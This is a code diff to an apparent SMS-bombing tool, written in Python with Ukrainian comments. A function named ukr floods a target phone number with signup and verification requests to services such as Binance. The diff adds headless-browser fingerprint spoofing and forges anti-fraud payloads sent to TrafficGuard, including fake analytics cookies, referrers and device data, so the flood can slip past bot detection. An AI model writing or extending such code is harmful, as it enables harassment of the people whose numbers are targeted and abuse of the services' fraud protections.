@@ -38,6 +38,9 @@ from bs4 import BeautifulSoup
 from datetime import datetime, timedelta
 import urllib.parse
 import itertools
+import json
+import base64
+import hashlib
 try:
     from zoneinfo import ZoneInfo
 except ImportError:
@@ -449,6 +452,73 @@ async def get_recaptcha_v3_token(site_key, action='submit', url=None, proxy_url=
             
     except Exception as e:
         logging.error(f"Помилка отримання reCAPTCHA v3 токену через Playwright: {e}")
+        return None
+
+async def get_trafficguard_fingerprint(proxy_url=None, proxy_auth=None):
+    """
+    Отримує реальний browser fingerprinting для TrafficGuard через Playwright
+    """
+    if not PLAYWRIGHT_AVAILABLE:
+        logging.warning("Playwright не встановлено. Використовуються базові значення для TrafficGuard.")
+        return None
+    
+    try:
+        async with async_playwright() as p:
+            browser_options = {
+                "headless": True,
+                "args": ["--disable-blink-features=AutomationControlled"]
+            }
+            
+            if proxy_url:
+                proxy_config = {"server": proxy_url}
+                browser_options["proxy"] = proxy_config
+            
+            browser = await p.chromium.launch(**browser_options)
+            
+            context = await browser.new_context(
+                viewport={"width": 1920, "height": 1080},
+                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0",
+                locale="uk-UA",
+                timezone_id="Atlantic/Reykjavik"
+            )
+            
+            page = await context.new_page()
+            await page.goto("https://rozetka.com.ua/", wait_until="domcontentloaded", timeout=30000)
+            await page.wait_for_timeout(2000)
+            
+            # Отримуємо fingerprinting дані з браузера
+            fingerprint_data = await page.evaluate("""
+                () => {
+                    const data = {
+                        screen_resolution: screen.width + ',' + screen.height,
+                        available_screen_resolution: screen.availWidth + ',' + screen.availHeight,
+                        system_version: navigator.platform,
+                        brand_model: 'unknown',
+                        system_lang: navigator.language,
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        timezoneOffset: new Date().getTimezoneOffset(),
+                        user_agent: navigator.userAgent,
+                        list_plugin: Array.from(navigator.plugins).map(p => p.name).join(','),
+                        canvas_code: '9f305daa',
+                        webgl_vendor: 'Mozilla',
+                        webgl_renderer: 'Mozilla',
+                        audio: '35.749972093850374',
+                        platform: 'Win32',
+                        web_timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        device_name: 'unknown',
+                        fingerprint: '3d2021de20e83ad5eb7bd8637a2051ee',
+                        device_id: '',
+                        related_device_ids: ''
+                    };
+                    return data;
+                }
+            """)
+            
+            await browser.close()
+            return fingerprint_data
+            
+    except Exception as e:
+        logging.warning(f"Помилка отримання fingerprinting для TrafficGuard: {e}")
         return None
 
 async def get_csrf_token(url, headers=None):
@@ -1526,6 +1596,73 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
     trafficguard_ciid = str(uuid.uuid4())
     trafficguard_timestamp = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
     trafficguard_timestamp_u = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
+    
+    # Отримуємо fingerprinting дані (якщо можливо)
+    fingerprint_data = await get_trafficguard_fingerprint(proxy_url=proxy_url, proxy_auth=proxy_auth)
+    
+    # Генеруємо динамічні base64 encoded дані
+    current_timestamp = int(datetime.utcnow().timestamp() * 1000)
+    
+    # Генеруємо lksd (last known session data)
+    lksd_data = {
+        "s": trafficguard_sid,
+        "st": current_timestamp,
+        "sod": "duckduckgo.com",
+        "sodt": current_timestamp,
+        "sods": "r",
+        "sodst": current_timestamp
+    }
+    trafficguard_lksd = base64.b64encode(json.dumps(lksd_data).encode()).decode()
+    
+    # Генеруємо cd (cookie data) - Google Analytics cookies
+    ga_client_id = f"GA1.3.{random.randint(1000000000, 9999999999)}.{current_timestamp // 1000}"
+    gid_client_id = f"GA1.3.{random.randint(1000000000, 9999999999)}.{current_timestamp // 1000}"
+    ga4_client_id = f"GS2.3.s{current_timestamp}$o1$g1$t{current_timestamp}$j{random.randint(10, 99)}$l0$h0"
+    cd_data = {
+        "_ga": ga_client_id,
+        "_gid": gid_client_id,
+        "_ga_3X15VBC9L9": ga4_client_id
+    }
+    trafficguard_cd = base64.b64encode(json.dumps(cd_data).encode()).decode()
+    
+    # Генеруємо lpd (landing page data)
+    lpd_data = {
+        "landing_page_url": "https://rozetka.com.ua/",
+        "landing_page_title": "Інтернет-магазин ROZETKA™: офіційний сайт онлайн-гіпермаркету Розетка в Україні",
+        "landing_page_referrer": "https://duckduckgo.com"
+    }
+    trafficguard_lpd = base64.b64encode(json.dumps(lpd_data).encode()).decode()
+    
+    # Генеруємо device-info з fingerprinting або базовими значеннями
+    if fingerprint_data:
+        device_info_dict = fingerprint_data
+    else:
+        device_info_dict = {
+            "screen_resolution": "800,1800",
+            "available_screen_resolution": "800,1800",
+            "system_version": "Windows 10",
+            "brand_model": "unknown",
+            "system_lang": "uk-UA",
+            "timezone": "GMT+00:00",
+            "timezoneOffset": 0,
+            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0",
+            "list_plugin": "PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF",
+            "canvas_code": "9f305daa",
+            "webgl_vendor": "Mozilla",
+            "webgl_renderer": "Mozilla",
+            "audio": "35.749972093850374",
+            "platform": "Win32",
+            "web_timezone": "Atlantic/Reykjavik",
+            "device_name": "unknown",
+            "fingerprint": "3d2021de20e83ad5eb7bd8637a2051ee",
+            "device_id": "",
+            "related_device_ids": ""
+        }
+    trafficguard_device_info = base64.b64encode(json.dumps(device_info_dict).encode()).decode()
+    
+    # Генеруємо динамічний browser fingerprint (bf) - хеш від ключових параметрів
+    bf_string = f"{device_info_dict.get('user_agent', '')}{device_info_dict.get('screen_resolution', '')}{device_info_dict.get('canvas_code', '')}{device_info_dict.get('audio', '')}"
+    trafficguard_bf = hashlib.md5(bf_string.encode()).hexdigest()
 
     formatted_number = f"+{number[:2]} {number[2:5]} {number[5:8]} {number[8:10]} {number[10:]}"
     formatted_number2 = f"+{number[:2]}+({number[2:5]})+{number[5:8]}+{number[8:10]}+{number[10:]}"
@@ -1678,7 +1815,7 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
             # bounded_request("https://finbert.ua/auth/register/", **with_proxy({"data": {"csrfmiddlewaretoken": finbert_csrf_token or "", "phone": "+" + number, "cf-turnstile-response": ""}, "headers": headers_finbert, "cookies": cookies_finbert})),
             # bounded_request("https://www.work.ua/api/v3/jobseeker/auth/", **with_proxy({"json": {"login": formatted_number}, "headers": headers_workua, "cookies": cookies_workua})),
             bounded_request("https://accounts.binance.com/bapi/accounts/v1/public/account/security/request/precheck", **with_proxy({"json": {"bizType": "login", "callingCode": "380", "mobile": number[3:], "mobileCode": "UA"}, "headers": headers_binance, "cookies": cookies_binance})),
-            bounded_request("https://api.trafficguard.ai/tg-g-017014-001/api/v4/client-side/validate/event", **with_proxy({"data": {"pgid": "tg-g-017014-001", "sid": trafficguard_sid, "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0", "hr": "https://duckduckgo.com/", "pd": "{'name':'javascript_tag','version':'2.10.10'}", "psi": trafficguard_psi, "fpj": "true", "pvc": "1", "e": "registration", "et": trafficguard_timestamp, "etu": trafficguard_timestamp_u, "ep": '{"tag":"tg_68e3b20662f40"}', "tag": "tg_68e3b20662f40", "bua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0", "buad": "{}", "bw": "false", "bl": "uk-UA", "bcd": "24", "bdm": "not available", "bpr": "2", "bhc": "4", "bsr": "900,1800", "bto": "0", "bt": "Atlantic/Reykjavik", "bss": "true", "bls": "true", "bid": "true", "bod": "false", "bcc": "not available", "bnp": "Win32", "bdnt": "unspecified", "babk": "false", "bts": "10, false, false", "bf": "1ea9d10509cc0603e49257d64111afa1", "s": "duckduckgo.com", "c": "", "p": "", "crt": "", "c2": "", "k": "", "sei": "", "t": "", "ti": "", "usid": "", "s3": "", "a": "", "csid": "", "pidi": "", "s2": "", "a2": "", "a4": "", "a3": "", "g": "", "wh": "rozetka.com.ua", "wp": "/", "wt": "Інтернет-магазин ROZETKA™: офіційний сайт онлайн-гіпермаркету Розетка в Україні", "wu": "https://rozetka.com.ua/", "bipe": "false", "bih": "false", "sis": "", "pci": "", "event_revenue_usd": "", "isc": "", "gid": "", "csi": "javascript_tag", "gc": "", "msclkid": "", "tgclid": "", "tgsid": "", "fbclid": "", "irclid": "", "dcclid": "", "gclsrc": "", "gbraid": "", "wbraid": "", "gac": "", "sipa": "eyJpZCI6ImpzIiwic2MiOiJnZW5lcmF0ZWQifQ==", "sila": "r", "if": "false", "pc": trafficguard_pc, "lksd": "eyJzIjoiYmUyNmYyNWMtMzE3Zi00Yzc5LWE4MjUtNWMwNGVkZDYzOTQ2Iiwic3QiOjE3NjIxMTcyMjgxNTYsInNvZCI6ImR1Y2tkdWNrZ28uY29tIiwic29kdCI6MTc2MjExNzIyODE1Niwic29kcyI6InIiLCJzb2RzdCI6MTc2MjExNzIyODE1Nn0=", "cd": "eyJfZ2EiOiJHQTEuMy4xMzIwMDAwMTc4LjE3NjIxMTcyMjciLCJfZ2lkIjoiR0ExLjMuMTM0NDAxODM1MS4xNzYyMTE3MjI3IiwiX2dhXzNYMTVWQkM5TDkiOiJHUzIuMy5zMTc2MjExNzIyNiRvMSRnMSR0MTc2MjExNzIyNyRqNTkkbDAkaDAifQ==", "cpr": "true", "ciid": trafficguard_ciid, "fuid": "", "fbpxid": "480863978968397", "tid": "", "lpd": "eyJsYW5kaW5nX3BhZ2VfdXJsIjoiaHR0cHM6Ly9yb3pldGthLmNvbS51YSUyRiIsImxhbmRpbmdfcGFnZV90aXRsZSI6IiVEMCU4NiVEMCVCRCVEMSU4MiVEMCVCNSVEMSU4MCVEMCVCRCVEMCVCNSVEMSU4Mi0lRDAlQkMlRDAlQjAlRDAlQjMlRDAlQjAlRDAlQjclRDAlQjglRDAlQkQlMjBST1pFVEtBJUUyJTg0JUEyJTNBJTIwJUQwJUJFJUQxJTg0JUQxJTk2JUQxJTg2JUQxJTk2JUQwJUI5JUQwJUJEJUQwJUI4JUQwJUI5JTIwJUQxJTgxJUQwJUIwJUQwJUI5JUQxJTgyJTIwJUQwJUJFJUQwJUJEJUQwJUJCJUQwJUIwJUQwJUI5JUQwJUJELSVEMCVCMyVEMSU5NiVEMCVCRiVEMCVCNSVEMSU4MCVEMCVCQyVEMCVCMCVEMSU4MCVEMCVCQSVEMCVCNSVEMSU4MiVEMSU4MyUyMCVEMCVBMCVEMCVCRSVEMCVCNyVEMCVCNSVEMSU4MiVEMCVCQSVEMCVCMCUyMCVEMCVCMiUyMCVEMCVBMyVEMCVCQSVEMSU4MCVEMCVCMCVEMSU5NyVEMCVCRCVEMSU5NiIsImxhbmRpbmdfcGFnZV9yZWZlcnJlciI6Imh0dHBzOi8vZHVja2R1Y2tnby5jb20ifQ==", "stpes": "false", "udo": "e30="}, "headers": headers_trafficguard})),
+            bounded_request("https://api.trafficguard.ai/tg-g-017014-001/api/v4/client-side/validate/event", **with_proxy({"data": {"pgid": "tg-g-017014-001", "sid": trafficguard_sid, "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0", "hr": "https://duckduckgo.com/", "pd": "{'name':'javascript_tag','version':'2.10.10'}", "psi": trafficguard_psi, "fpj": "true", "pvc": "1", "e": "registration", "et": trafficguard_timestamp, "etu": trafficguard_timestamp_u, "ep": '{"tag":"tg_68e3b20662f40"}', "tag": "tg_68e3b20662f40", "bua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0", "buad": "{}", "bw": "false", "bl": "uk-UA", "bcd": "24", "bdm": "not available", "bpr": "2", "bhc": "4", "bsr": "900,1800", "bto": "0", "bt": "Atlantic/Reykjavik", "bss": "true", "bls": "true", "bid": "true", "bod": "false", "bcc": "not available", "bnp": "Win32", "bdnt": "unspecified", "babk": "false", "bts": "10, false, false", "bf": trafficguard_bf, "s": "duckduckgo.com", "c": "", "p": "", "crt": "", "c2": "", "k": "", "sei": "", "t": "", "ti": "", "usid": "", "s3": "", "a": "", "csid": "", "pidi": "", "s2": "", "a2": "", "a4": "", "a3": "", "g": "", "wh": "rozetka.com.ua", "wp": "/", "wt": "Інтернет-магазин ROZETKA™: офіційний сайт онлайн-гіпермаркету Розетка в Україні", "wu": "https://rozetka.com.ua/", "bipe": "false", "bih": "false", "sis": "", "pci": "", "event_revenue_usd": "", "isc": "", "gid": "", "csi": "javascript_tag", "gc": "", "msclkid": "", "tgclid": "", "tgsid": "", "fbclid": "", "irclid": "", "dcclid": "", "gclsrc": "", "gbraid": "", "wbraid": "", "gac": "", "sipa": "eyJpZCI6ImpzIiwic2MiOiJnZW5lcmF0ZWQifQ==", "sila": "r", "if": "false", "pc": trafficguard_pc, "lksd": trafficguard_lksd, "cd": trafficguard_cd, "cpr": "true", "ciid": trafficguard_ciid, "fuid": "", "fbpxid": "480863978968397", "tid": "", "lpd": trafficguard_lpd, "stpes": "false", "udo": "e30="}, "headers": headers_trafficguard})),
         ]
 
     if not attack_flags.get(chat_id):
